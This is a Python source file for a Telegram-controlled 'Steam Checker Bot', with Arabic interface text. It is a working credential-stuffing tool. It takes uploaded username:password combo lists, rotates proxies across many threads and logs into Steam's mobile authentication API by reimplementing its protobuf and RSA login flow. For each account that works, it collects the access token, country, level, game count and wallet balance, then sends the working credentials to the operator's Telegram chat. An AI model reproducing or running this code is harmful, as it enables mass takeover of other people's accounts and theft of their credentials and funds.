#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Steam Checker Bot - Koyeb Edition
# Crated by - Antonio
# Telegram - @Qnge_gyan

import os
import sys
import re
import json
import base64
import random
import struct
import time
import threading
import traceback
import requests
import urllib.parse as urlenc
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock
from datetime import datetime

# ══════════════════════════════════════════════════════════════════
# إعدادات (تُقرأ من Environment Variables في Koyeb)
# ══════════════════════════════════════════════════════════════════
BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "")
ADMIN_ID  = os.environ.get("TELEGRAM_CHAT_ID", "")

if not BOT_TOKEN or not ADMIN_ID:
    print("[FATAL] TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID must be set")
    sys.exit(1)

POLL_INTERVAL = 2

# ══════════════════════════════════════════════════════════════════
# Globals
# ══════════════════════════════════════════════════════════════════
stats = {"hit": 0, "2fa": 0, "bad": 0, "free": 0, "ban": 0, "err": 0, "done": 0}
_stats_lock = Lock()

scan_state = {
    "running": False, "stop": False,
    "combo_file": "", "proxy_file": "",
    "threads": 50, "total": 0, "started_at": None,
}
_state_lock = Lock()

alive_proxies = []
proxy_lock = Lock()
last_update_id = [0]
open_files = {}
pending_action = {"action": None, "chat_id": None}

# ══════════════════════════════════════════════════════════════════
# Telegram API
# ══════════════════════════════════════════════════════════════════
def tg_api(method, data=None, files=None, timeout=30):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/{method}"
        if files:
            r = requests.post(url, data=data, files=files, timeout=timeout)
        else:
            r = requests.post(url, json=data, timeout=timeout)
        return r.json() if r.status_code == 200 else None
    except Exception as e:
        log(f"[TG ERR] {e}")
        return None


def tg_send(text, chat_id=None):
    return tg_api("sendMessage", {
        "chat_id": chat_id or ADMIN_ID,
        "text": text,
        "parse_mode": "HTML",
        "disable_web_page_preview": True,
    })


def tg_send_async(text, chat_id=None):
    threading.Thread(target=tg_send, args=(text, chat_id), daemon=True).start()


def tg_send_document(file_path, caption="", chat_id=None):
    if not os.path.isfile(file_path) or os.path.getsize(file_path) == 0:
        return False
    try:
        with open(file_path, "rb") as f:
            files = {"document": (os.path.basename(file_path), f, "text/plain")}
            data = {"chat_id": chat_id or ADMIN_ID}
            if caption:
                data["caption"] = caption[:1000]
                data["parse_mode"] = "HTML"
            r = requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
                data=data, files=files, timeout=180,
            )
        return r.status_code == 200
    except Exception as e:
        log(f"[TG DOC ERR] {e}")
        return False


def get_updates(offset=0):
    try:
        r = requests.get(
            f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates",
            params={"offset": offset, "timeout": 10},
            timeout=15,
        )
        if r.status_code == 200:
            return r.json().get("result", [])
    except Exception:
        pass
    return []


def log(text):
    try:
        ts = datetime.now().strftime("%H:%M:%S")
        sys.stdout.write(f"[{ts}] {text}\n")
        sys.stdout.flush()
    except Exception:
        pass


def esc(t):
    if not isinstance(t, str):
        t = str(t)
    return t.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")


# ══════════════════════════════════════════════════════════════════
# Protobuf helpers
# ══════════════════════════════════════════════════════════════════
def brn_vi(v):
    if v < 0:
        v &= 0xffffffffffffffff
    buf = bytearray()
    while v > 0x7f:
        buf.append(0x80 | (v & 0x7f))
        v >>= 7
    buf.append(v & 0x7f)
    return bytes(buf)


def brn_rvi(b, pos):
    r = s = 0
    while pos < len(b):
        x = b[pos]; pos += 1
        r |= (x & 0x7f) << s
        if not (x & 0x80):
            break
        s += 7
    return r, pos


def ps(field, s):
    d = s.encode() if isinstance(s, str) else s
    return brn_vi((field << 3) | 2) + brn_vi(len(d)) + d


def pr(field, d):
    return brn_vi((field << 3) | 2) + brn_vi(len(d)) + d


def pi(field, v):
    return brn_vi(field << 3) + brn_vi(v if v >= 0 else v & 0xffffffffffffffff)


def pd(raw):
    out = {}
    pos = 0
    while pos < len(raw):
        try:
            tag, pos = brn_rvi(raw, pos)
        except:
            break
        field = tag >> 3
        wt = tag & 7
        if field < 1:
            break
        if wt == 0:
            val, pos = brn_rvi(raw, pos)
            prev = out.get(field)
            if prev is not None:
                out[field] = [prev, val] if not isinstance(prev, list) else prev + [val]
            else:
                out[field] = val
        elif wt == 2:
            ln, pos = brn_rvi(raw, pos)
            if pos + ln > len(raw):
                break
            chunk = raw[pos:pos + ln]
            pos += ln
            prev = out.get(field)
            if prev is not None:
                out[field] = [prev, chunk] if not isinstance(prev, list) else prev + [chunk]
            else:
                out[field] = chunk
        elif wt == 5:
            if pos + 4 > len(raw):
                break
            out[field] = struct.unpack_from("<I", raw, pos)[0]
            pos += 4
        elif wt == 1:
            if pos + 8 > len(raw):
                break
            out[field] = struct.unpack_from("<Q", raw, pos)[0]
            pos += 8
        else:
            break
    return out


def rsa_encrypt(pw, mod_hex, exp_hex):
    mb = bytes.fromhex(mod_hex)
    n = int.from_bytes(mb, "big")
    e = int(exp_hex, 16)
    pw_b = pw.encode()
    k = len(mb)
    fill = k - len(pw_b) - 3
    pad = bytes(random.randint(1, 255) for _ in range(fill))
    block = b"\x00\x02" + pad + b"\x00" + pw_b
    m = int.from_bytes(block, "big")
    c = pow(m, e, n)
    return base64.b64encode(c.to_bytes(k, "big")).decode()


BRN_CT = "multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW"


def brn_mp(k, v):
    return (
        f"------WebKitFormBoundary7MA4YWxkTrZu0gW\r\n"
        f'Content-Disposition: form-data; name="{k}"\r\n\r\n'
        f"{v}\r\n"
        f"------WebKitFormBoundary7MA4YWxkTrZu0gW--\r\n"
    ).encode()


BRN_H = {
    "Accept": "application/json, text/plain, */*",
    "Accept-Encoding": "gzip",
    "Connection": "Keep-Alive",
    "User-Agent": "okhttp/4.9.2",
}

BRN_MAP = {"US": "United States", "GB": "United Kingdom", "SA": "Saudi Arabia",
           "AE": "UAE", "EG": "Egypt", "IQ": "Iraq", "JO": "Jordan",
           "KW": "Kuwait", "QA": "Qatar", "DE": "Germany", "FR": "France",
           "TR": "Turkey", "IR": "Iran", "CN": "China", "JP": "Japan",
           "KR": "South Korea", "IN": "India", "PK": "Pakistan", "BR": "Brazil",
           "RU": "Russia", "UA": "Ukraine", "CA": "Canada", "MX": "Mexico"}


# ══════════════════════════════════════════════════════════════════
# Steam Check
# ══════════════════════════════════════════════════════════════════
def steam_check(username, password, proxy=None):
    s = requests.Session()
    s.headers.update(BRN_H)
    s.headers["Cookie"] = "Steam_Language=english"
    if proxy:
        s.proxies = {"http": proxy, "https": proxy}
    try:
        pb = ps(1, username)
        enc = urlenc.quote(base64.b64encode(pb).decode())
        r = s.get(
            "https://api.steampowered.com/IAuthenticationService/GetPasswordRSAPublicKey/v1"
            f"?origin=SteamMobile&input_protobuf_encoded={enc}",
            timeout=15,
        )
        if r.status_code != 200:
            return {"st": "err", "info": f"rsa:{r.status_code}"}

        rd = pd(r.content)
        mod = rd.get(1, b"")
        exp = rd.get(2, b"")
        ts = rd.get(3, 0)
        if isinstance(mod, bytes): mod = mod.decode()
        if isinstance(exp, bytes): exp = exp.decode()
        if not mod or not exp:
            return {"st": "err", "info": "rsa empty"}

        epw = rsa_encrypt(password, mod, exp)
        dev = ps(1, "SM-S256B") + pi(2, 3) + pi(3, -500) + pi(4, 1)
        auth = (ps(2, username) + ps(3, epw) + pi(4, ts) + pi(5, 1) +
                pi(7, 1) + ps(8, "Mobile") + pr(9, dev) + pi(11, 0))
        b64 = base64.b64encode(auth).decode()

        r = s.post(
            "https://api.steampowered.com/IAuthenticationService/BeginAuthSessionViaCredentials/v1",
            data=brn_mp("input_protobuf_encoded", b64),
            headers={"Content-Type": BRN_CT}, timeout=15,
        )

        er = 0
        try: er = int(r.headers.get("X-eresult", "0"))
        except: pass

        if er in (5, 2): return {"st": "bad"}
        if er in (63, 43): return {"st": "ban"}
        if er != 1: return {"st": "err", "info": f"eresult={er}"}

        ar = pd(r.content)
        cid = ar.get(1, 0)
        rid = ar.get(2, b"")
        sid = ar.get(5, 0)
        confs = ar.get(4, [])
        if isinstance(confs, bytes): confs = [confs]
        elif not isinstance(confs, list): confs = []

        ctypes = []
        for cf in confs:
            if isinstance(cf, bytes):
                parsed = pd(cf)
                ct = parsed.get(1, 0)
                if isinstance(ct, list): ctypes.extend(ct)
                else: ctypes.append(ct)

        if any(t in (2, 3, 4, 5, 6) for t in ctypes):
            return {"st": "2fa", "sid": str(sid),
                    "types": ",".join(str(t) for t in ctypes)}

        poll = pi(1, cid) + pr(2, rid)
        b64 = base64.b64encode(poll).decode()
        r = s.post(
            "https://api.steampowered.com/IAuthenticationService/PollAuthSessionStatus/v1",
            data=brn_mp("input_protobuf_encoded", b64),
            headers={"Content-Type": BRN_CT, "Accept-Encoding": "identity"},
            timeout=15,
        )
        prd = pd(r.content)
        tk = prd.get(4, b"")
        if isinstance(tk, bytes): tk = tk.decode("utf-8", errors="ignore")
        if not tk:
            return {"st": "err", "info": "no token"}

        parts = tk.split(".")
        if len(parts) < 2: return {"st": "err", "info": "bad jwt"}
        payload = parts[1]
        rem = len(payload) % 4
        if rem: payload += "=" * (4 - rem)
        try:
            jwt = json.loads(base64.urlsafe_b64decode(payload))
        except: jwt = {}
        steamid = str(jwt.get("sub", sid))
        sid_int = int(steamid)

        ck = (f"Steam_Language=english; "
              f"steamLoginSecure={steamid}%7C%7C{urlenc.quote(tk)}; "
              f"mobileClient=android; mobileClientVersion=777777 3.10.9")

        res = {"st": "hit", "sid": steamid, "country": "", "cc": "",
               "level": "", "games": 0, "balance": "", "game_list": []}

        try:
            cpb = struct.pack("<BQ", 0x09, sid_int)
            r = s.post(
                f"https://api.steampowered.com/IUserAccountService/GetUserCountry/v1"
                f"?access_token={tk}&spoof_steamid=",
                data=brn_mp("input_protobuf_encoded", base64.b64encode(cpb).decode()),
                headers={"Content-Type": BRN_CT}, timeout=10,
            )
            cr = pd(r.content)
            cc = cr.get(1, b"")
            if isinstance(cc, bytes): cc = cc.decode()
            res["cc"] = cc
            res["country"] = BRN_MAP.get(cc, cc)
        except: pass

        try:
            gpb = (pi(1, sid_int) + pi(2, 1) + pi(3, 1) + pi(6, 0) +
                   ps(7, "english") + pi(8, 1))
            gb64 = urlenc.quote(base64.b64encode(gpb).decode())
            s.headers["Cookie"] = ck
            r = s.get(
                f"https://api.steampowered.com/IPlayerService/GetOwnedGames/v1"
                f"?access_token={tk}&spoof_steamid=&origin=SteamMobile"
                f"&input_protobuf_encoded={gb64}",
                timeout=10,
            )
            gr = pd(r.content)
            res["games"] = gr.get(1, 0)
        except: pass

        try:
            mpid = sid_int - 76561197960265728
            s.headers["Cookie"] = ck
            r = s.get(f"https://steamcommunity.com/miniprofile/{mpid}/json", timeout=10)
            try:
                mpj = r.json()
                lv = mpj.get("level", mpj.get("player_level", ""))
                res["level"] = str(lv) if lv != "" else ""
            except:
                m = re.search(r"friendPlayerLevel\s+(\S+)", r.text)
                if m: res["level"] = m.group(1)
        except: pass

        try:
            r = s.post(
                f"https://api.steampowered.com/IUserAccountService/GetClientWalletDetails/v1"
                f"?access_token={tk}&spoof_steamid=",
                data=brn_mp("input_protobuf_encoded", "GAE="),
                headers={"Content-Type": BRN_CT}, timeout=10,
            )
            wr = pd(r.content)
            bal = wr.get(14, b"")
            if isinstance(bal, bytes): bal = bal.decode("utf-8", errors="ignore")
            elif isinstance(bal, int): bal = str(bal)
            res["balance"] = bal
        except: pass

        return res

    except requests.exceptions.ProxyError:
        return {"st": "err", "info": "proxy dead"}
    except requests.exceptions.Timeout:
        return {"st": "err", "info": "timeout"}
    except requests.exceptions.ConnectionError:
        return {"st": "err", "info": "conn failed"}
    except Exception as e:
        return {"st": "err", "info": str(e)[:80]}


# ══════════════════════════════════════════════════════════════════
# Logger
# ══════════════════════════════════════════════════════════════════
def log_result(username, password, res):
    combo = f"{username}:{password}"
    st = res["st"]
    with _stats_lock:
        stats["done"] += 1
        if st == "hit":
            stats["hit"] += 1
            log(f"[HIT] {combo}")
            try:
                open_files["hits"].write(f"{combo} | {res}\n")
                open_files["hits"].flush()
            except: pass
            tg_send_async(
                f"🎯 <b>STEAM HIT</b>\n"
                f"👤 <code>{esc(combo)}</code>\n"
                f"🆔 <code>{esc(res.get('sid','?'))}</code>\n"
                f"📊 Lvl: {esc(res.get('level') or '?')}\n"
                f"🌍 {esc(res.get('country') or '?')}"
            )
        elif st == "2fa":
            stats["2fa"] += 1
            log(f"[2FA] {combo}")
            try:
                open_files["2fa"].write(f"{combo} | {res}\n")
                open_files["2fa"].flush()
            except: pass
            tg_send_async(
                f"🔐 <b>STEAM 2FA</b>\n"
                f"👤 <code>{esc(combo)}</code>\n"
                f"🆔 <code>{esc(res.get('sid','?'))}</code>"
            )
        elif st == "free":
            stats["free"] += 1
            log(f"[FREE] {combo}")
            try:
                open_files["free"].write(f"{combo} | {res}\n")
                open_files["free"].flush()
            except: pass
            tg_send_async(f"✅ <b>FREE</b>\n<code>{esc(combo)}</code>")
        elif st == "bad":
            stats["bad"] += 1
            log(f"[BAD] {combo}")
        elif st == "ban":
            stats["ban"] += 1
            log(f"[BAN] {combo}")
        else:
            stats["err"] += 1
            log(f"[ERR] {combo} | {res.get('info','?')}")


# ══════════════════════════════════════════════════════════════════
# Scan
# ══════════════════════════════════════════════════════════════════
def run_scan():
    global alive_proxies, open_files
    combo_file = scan_state["combo_file"]
    proxy_file = scan_state["proxy_file"]
    threads = scan_state["threads"]

    try:
        with open(combo_file, "r", encoding="utf-8", errors="ignore") as f:
            combos = [l.strip() for l in f if ":" in l]
    except Exception as e:
        tg_send(f"❌ Cannot read combo file: {e}")
        scan_state["running"] = False
        return

    with proxy_lock:
        alive_proxies.clear()
        if proxy_file and os.path.isfile(proxy_file):
            with open(proxy_file, "r", errors="ignore") as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith("#"):
                        if not line.startswith(("http://", "https://", "socks4://", "socks5://")):
                            parts = line.split(":")
                            if len(parts) == 2:
                                line = f"http://{parts[0]}:{parts[1]}"
                            else:
                                continue
                        alive_proxies.append(line)

    scan_state["total"] = len(combos)
    scan_state["started_at"] = time.time()

    os.makedirs("output", exist_ok=True)
    tag = datetime.now().strftime("%Y%m%d_%H%M%S")
    open_files = {
        "hits": open(f"output/hits_{tag}.txt", "a", encoding="utf-8"),
        "2fa":  open(f"output/2fa_{tag}.txt", "a", encoding="utf-8"),
        "free": open(f"output/free_{tag}.txt", "a", encoding="utf-8"),
    }

    tg_send(
        f"🚀 <b>Steam Checker Started</b>\n"
        f"📦 Combos: <b>{len(combos):,}</b>\n"
        f"⚡ Threads: <b>{threads}</b>\n"
        f"🌐 Proxies: <b>{len(alive_proxies)}</b>"
    )

    pxi = [0]
    pxlk = Lock()
    def next_proxy():
        if not alive_proxies: return None
        with pxlk:
            px = alive_proxies[pxi[0] % len(alive_proxies)]
            pxi[0] += 1
            return px

    try:
        with ThreadPoolExecutor(max_workers=threads) as pool:
            futs = {pool.submit(steam_check, *c.split(":", 1), next_proxy()): c for c in combos}
            for fut in as_completed(futs):
                if scan_state["stop"]:
                    break
                line = futs[fut]
                try:
                    res = fut.result()
                except Exception as e:
                    res = {"st": "err", "info": str(e)[:60]}
                parts = line.split(":", 1)
                log_result(parts[0], parts[1], res)
    except Exception as e:
        log(f"[SCAN ERR] {e}")

    elapsed = time.time() - scan_state["started_at"]
    for f in open_files.values():
        try: f.close()
        except: pass
    open_files = {}

    with _stats_lock:
        final = dict(stats)

    tg_send(
        f"🏁 <b>Finished</b>\n"
        f"⏱ {elapsed:.0f}s\n"
        f"🎯 HIT: {final['hit']}\n"
        f"🔐 2FA: {final['2fa']}\n"
        f"✅ FREE: {final['free']}\n"
        f"❌ BAD: {final['bad']}\n"
        f"⚠️ ERR: {final['err']}"
    )

    scan_state["running"] = False
    scan_state["stop"] = False


# ══════════════════════════════════════════════════════════════════
# Commands
# ══════════════════════════════════════════════════════════════════
def cmd_start(cid):
    tg_send(
        f"🤖 <b>Steam Checker Bot</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"/setcombo - رفع ملف الكومبو\n"
        f"/setproxy - رفع ملف البروكسيات\n"
        f"/setthreads 50 - عدد الثريدات\n"
        f"/run - بدء الفحص\n"
        f"/status - الحالة\n"
        f"/stats - الإحصائيات\n"
        f"/stop - إيقاف",
        cid
    )


def cmd_setcombo(cid):
    tg_send("📁 أرسل ملف الكومبو (user:pass)", cid)
    pending_action["action"] = "wait_combo"
    pending_action["chat_id"] = cid


def cmd_setproxy(cid):
    tg_send("🌐 أرسل ملف البروكسيات", cid)
    pending_action["action"] = "wait_proxy"
    pending_action["chat_id"] = cid


def cmd_setthreads(cid, args):
    try:
        t = max(1, min(500, int(args.strip())))
        scan_state["threads"] = t
        tg_send(f"✅ Threads = <b>{t}</b>", cid)
    except:
        tg_send("❌ استخدام: /setthreads 50", cid)


def cmd_run(cid):
    if scan_state["running"]:
        tg_send("⚠️ يوجد فحص يعمل", cid)
        return
    if not scan_state["combo_file"]:
        tg_send("❌ ارفع ملف الكومبو أولاً", cid)
        return
    with _stats_lock:
        for k in stats: stats[k] = 0
    scan_state["running"] = True
    scan_state["stop"] = False
    threading.Thread(target=run_scan, daemon=True).start()
    tg_send("▶️ بدء الفحص...", cid)


def cmd_status(cid):
    if not scan_state["running"]:
        tg_send("ℹ️ لا يوجد فحص يعمل", cid)
        return
    with _stats_lock:
        done = stats["done"]; hit = stats["hit"]
    el = time.time() - (scan_state["started_at"] or time.time())
    tg_send(
        f"📊 <b>Status</b>\n"
        f"📦 {done:,}/{scan_state['total']:,}\n"
        f"⏱ {el:.0f}s\n"
        f"🎯 HIT: {hit}",
        cid
    )


def cmd_stats(cid):
    with _stats_lock:
        s = dict(stats)
    tg_send(
        f"📈 <b>Stats</b>\n"
        f"🎯 HIT: {s['hit']}\n"
        f"🔐 2FA: {s['2fa']}\n"
        f"✅ FREE: {s['free']}\n"
        f"❌ BAD: {s['bad']}\n"
        f"🚫 BAN: {s['ban']}\n"
        f"⚠️ ERR: {s['err']}\n"
        f"📦 Done: {s['done']:,}",
        cid
    )


def cmd_stop(cid):
    if not scan_state["running"]:
        tg_send("ℹ️ لا يوجد فحص", cid)
        return
    scan_state["stop"] = True
    tg_send("⏹ جاري الإيقاف...", cid)


# ══════════════════════════════════════════════════════════════════
# Document Handler
# ══════════════════════════════════════════════════════════════════
def handle_document(msg):
    cid = str(msg["chat"]["id"])
    doc = msg["document"]
    if doc.get("file_size", 0) > 20 * 1024 * 1024:
        tg_send("❌ ملف كبير جداً (20MB حد)", cid)
        return
    try:
        file_id = doc["file_id"]
        r = requests.get(
            f"https://api.telegram.org/bot{BOT_TOKEN}/getFile",
            params={"file_id": file_id}, timeout=15,
        )
        file_path = r.json()["result"]["file_path"]
        r2 = requests.get(
            f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_path}",
            timeout=60,
        )
        os.makedirs("uploads", exist_ok=True)
        local = f"uploads/{doc.get('file_name', 'file.txt')}"
        with open(local, "wb") as f:
            f.write(r2.content)
    except Exception as e:
        tg_send(f"❌ فشل التحميل: {e}", cid)
        return

    action = pending_action.get("action")
    if action == "wait_combo":
        scan_state["combo_file"] = local
        pending_action["action"] = None
        tg_send(f"✅ Combo loaded\n📁 {doc.get('file_name')}", cid)
    elif action == "wait_proxy":
        scan_state["proxy_file"] = local
        pending_action["action"] = None
        tg_send(f"✅ Proxy loaded\n📁 {doc.get('file_name')}", cid)
    else:
        scan_state["proxy_file"] = local
        tg_send(f"✅ Saved\n📁 {doc.get('file_name')}", cid)


def handle_message(msg):
    cid = str(msg["chat"]["id"])
    if cid != str(ADMIN_ID):
        return
    if "document" in msg:
        handle_document(msg)
        return
    text = msg.get("text", "").strip()
    if not text:
        return
    parts = text.split(None, 1)
    cmd = parts[0].lower()
    args = parts[1] if len(parts) > 1 else ""
    if "@" in cmd:
        cmd = cmd.split("@")[0]
    handlers = {
        "/start": lambda: cmd_start(cid),
        "/help": lambda: cmd_start(cid),
        "/setcombo": lambda: cmd_setcombo(cid),
        "/setproxy": lambda: cmd_setproxy(cid),
        "/setthreads": lambda: cmd_setthreads(cid, args),
        "/run": lambda: cmd_run(cid),
        "/status": lambda: cmd_status(cid),
        "/stats": lambda: cmd_stats(cid),
        "/stop": lambda: cmd_stop(cid),
    }
    if cmd in handlers:
        try: handlers[cmd]()
        except Exception as e:
            log(f"[CMD ERR] {e}")
            tg_send(f"❌ {e}", cid)


# ══════════════════════════════════════════════════════════════════
# Main
# ══════════════════════════════════════════════════════════════════
def main():
    log("=" * 50)
    log("  Steam Checker Bot")
    log(f"  Admin: {ADMIN_ID}")
    log("=" * 50)

    try:
        r = requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/getMe", timeout=10)
        if r.status_code == 200:
            log(f"[OK] Bot: @{r.json()['result'].get('username')}")
        else:
            log("[!] Invalid token")
            return
    except Exception as e:
        log(f"[!] Cannot reach Telegram: {e}")
        return

    tg_send("✅ <b>Bot Online</b>\nاستخدم /start")

    while True:
        try:
            updates = get_updates(offset=last_update_id[0] + 1)
            for upd in updates:
                last_update_id[0] = max(last_update_id[0], upd["update_id"])
                try:
                    if "message" in upd:
                        handle_message(upd["message"])
                except Exception as e:
                    log(f"[UPD ERR] {e}")
            time.sleep(POLL_INTERVAL)
        except KeyboardInterrupt:
            break
        except Exception as e:
            log(f"[LOOP ERR] {e}")
            time.sleep(5)


if __name__ == "__main__":
    main()
